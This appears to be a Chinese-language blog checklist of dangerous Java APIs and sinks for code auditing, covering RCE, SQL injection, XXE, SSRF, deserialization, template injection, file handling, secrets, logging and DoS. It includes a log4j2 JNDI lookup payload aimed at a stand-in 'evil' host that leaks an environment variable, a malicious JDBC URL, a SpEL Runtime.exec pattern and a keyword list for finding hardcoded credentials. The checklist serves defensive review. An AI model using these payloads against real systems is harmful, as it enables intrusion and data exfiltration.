Java代码审计

发表于2025-12-18|更新于2025-12-18
|浏览量:

一、命令执行（RCE）

  1. Runtime
    exec(String) / exec(String[]) / exec(String,String[],File) / exec(String[],String[],File)
  2. ProcessBuilder
    start() / command(…) / Directory(…) / inheritIO()
  3. ProcessImpl（JDK 私有，只能通过反射）
    start(String[],Map,String,Redirect[],boolean)
  4. UNIXProcess（Linux 私有，同上）
    start(String[],Map,String,Redirect[],boolean)
  5. System
    load(String) / loadLibrary(String)
  6. 反射链（常见绕过）
    Class.forName(“java.lang.ProcessBuilder”)
    getMethod(“start”).invoke(…)
  7. Script/动态语言
    GroovyShell.evaluate / GroovyClassLoader.parseClass
    JavaScriptEngine.eval / NashornScriptEngine.eval
  8. SpEL
    ExpressionParser.parseExpression + T(java.lang.Runtime).getRuntime().exec(…)
  9. EL / OGNL / MVEL
    Ognl.getValue / MVEL.eval / Fel.eval
  10. 第三方命令封装
    Apache Commons Exec：CommandLine / DefaultExecutor
    ZT-Process：Processes.newProcess / pty4j.PtyProcessBuilder

二、SQL 注入
① JDBC 原生
Statement：execute / executeQuery / executeUpdate / executeLargeUpdate
② MyBatis
占位符（XML或注解）@Select(“ {sql}”) / @Update(“${sql}”)
③ JPA / Hibernate
createNativeQuery(sql) / createSQLQuery(sql) / addEntity(..)
@Query(value=”native”, nativeQuery=true) 拼接
④ Spring JdbcTemplate
queryForObject(String sql, …) 拼接
⑤ Apache DbUtils
QueryRunner.query / update / insert / batch 拼接
⑥ 其他 ORM
jOOQ：DSL.query(sql) 拼接
MyBatis-Plus：apply(“xxx”) 拼接

三、XML 外部实体（XXE）

  1. DOM
    DocumentBuilder.parse / setFeature
  2. SAX
    SAXParser.parse / XMLReader.parse
  3. StAX
    XMLStreamReader / XMLInputFactory.createXMLStreamReader
  4. JAXB
    Unmarshaller.unmarshal
  5. XStream
    fromXML / toXML
  6. DOM4j
    SAXReader.read
  7. jdom2
    SAXBuilder.build
  8. POI OOXML（Office 解析）
    XSSFWorkWorkbook / OPCPackage.open
  9. Spring OXM
    Jaxb2Marshaller.unmarshal
  10. 搜索关键词
    “DOCTYPE”、“ENTITY”、“SYSTEM”、“PUBLIC” 直接出现

四、SSRF

  1. Java SE
    new URL(..).openConnection / openStream / getContent
    HttpURLConnection.connect / getInputStream
    URLClassLoader.newInstance（可加载远程 jar）
  2. Apache HttpClient 3.x
    HttpClient.executeMethod / GetMethod / PostMethod
  3. Apache HttpClient 4.x/5.x
    CloseableHttpClient.execute / Request.Get / Request.Post
  4. OkHttp
    OkHttpClient.newCall.execute
  5. Spring RestTemplate
    getForObject / postForObject / exchange
  6. JAX-RS Client
    ClientBuilder.newClient().target(url).request().get()
  7. Netty
    Bootstrap.connect(host,port)
  8. 邮件客户端
    JavaMail：Transport.send 若 Properties 的 mail.smtp.host 用户可控
  9. FTP/SFTP
    FTPClient.connect / ChannelSftp.get
  10. 数据库 JDBC URL
    若 jdbc:mysql://evil/mysql 也可触发 DNS 解析

五、反序列化

  1. 原生
    ObjectInputStream.readObject / readUnshared / readResolve

  2. XML
    XStream.fromXML

    XMLDecoder.readObject

  3. JSON
    ObjectMapper.enableDefaultTyping / readValue
    Gson.fromJson（带 TypeToken 且含接口/抽象类）
    Fastjson parseObject / parse / 1.2.68 autoType
    Jackson PolymorphicDeserialization

  4. YAML
    Yaml.load / SnakeYAML Constructor

  5. Hessian / Burlap
    HessianInput.readObject

  6. JNDI
    InitialContext.lookup / ctx.lookup

  7. RMI
    Registry.lookup / RMIConnection.invoke

  8. JMX
    JMXConnectorFactory.connect

  9. 第三方
    Kryo.readObject / FSTObjectInput.readObject / Protostuff

六、表达式/模板注入

  1. SpEL
    SpelExpressionParser.parseExpression / getValue
  2. OGNL
    Ognl.getValue / setValue / OgnlUtil.getValue
  3. MVEL
    MVEL.eval / compileExpression
  4. JEXL
    JexlEngine.createExpression / evaluate
  5. FreeMarker
    Template.process / <@s.include value=…>
  6. Velocity
    Velocity.evaluate / merge
  7. Thymeleaf
    #request.getParameter / ${…}
  8. JSP EL
    ${param.xxx} 拼接再解析
  9. 规则引擎
    Drools：kSession.insert / fireAllRules（规则文本用户可控）

七、文件/路径/上传

  1. 路径穿越
    new File(parent,name) / FileInputStream / FileOutputStream / FileReader / FileWriter / RandomAccessFile

    Path.resolve / Paths.get

  2. 上传
    MultipartFile.transferTo / Item.write / FileItem.write

  3. 解压
    ZipInputStream.getNextEntry / ZipFile.getEntry → ZipSlip
    TarArchiveInputStream

  4. 删除/重命名
    File.delete / deleteOnExit / renameTo

  5. 目录遍历
    File.list / listFiles / walk / find

  6. 临时文件
    File.createTempFile / Files.createTempDirectory（若前缀/后缀可控）

  7. 符号链接
    Files.createSymbolicLink

  8. Office 解析
    POI：OPCPackage.open / XSSFWorkbook → 若路径用户可控

八、信息泄露/硬编码

  1. 关键字
    password=、secret=、apikey=、privateKey=、accessKey=、jdbc.password
  2. 系统属性
    System.getProperty / setProperty / getProperties
  3. 环境变量
    System.getenv / ProcessBuilder.environment()
  4. 异常堆栈
    e.printStackTrace / logger.error(“”,e) 返回到前端
  5. 调试接口
    /actuator/env / /configprops / /heapdump

九、反射/类加载

  1. Class
    Class.forName / loadClass / getDeclaredMethod / getMethod
    Method.invoke / setAccessible
  2. 类加载器
    URLClassLoader.newInstance / defineClass / findClass
    Thread.contextClassLoader
  3. Unsafe
    Unsafe.allocateInstance / defineAnonymousClass / putObject
  4. Instrumentation
    Instrumentation.redefineClasses / appendToBootstrapClassLoaderSearch
  5. JNDI
    Context.lookup / DirectoryManager.getObjectInstance

十、日志伪造

  1. 日志打印
    log4j1/2、logback、JUL：logger.info(“user:” + userInput)
  2. 回车换行
    若 userInput 含 \r\n 可伪造多行日志
  3. log4j2 Lookup
    jndi:ldap://evil/ {env:USER} / ${java:os}

十一、拒绝服务/资源耗尽——完整版

  1. 线程
    Thread.start / Executor.submit / ForkJoinPool 用户可控线程数
  2. 大数组
    new byte[size]、StringUtils.repeat 若 size 用户可控
  3. 正则
    Pattern.match / replaceAll 使用 “灾难性回溯” 正则
  4. 压缩炸弹
    ZipInputStream 未限制 entry size / ratio
  5. sleep/阻塞
    Thread.sleep、LockSupport.parkNanos 参数用户可控
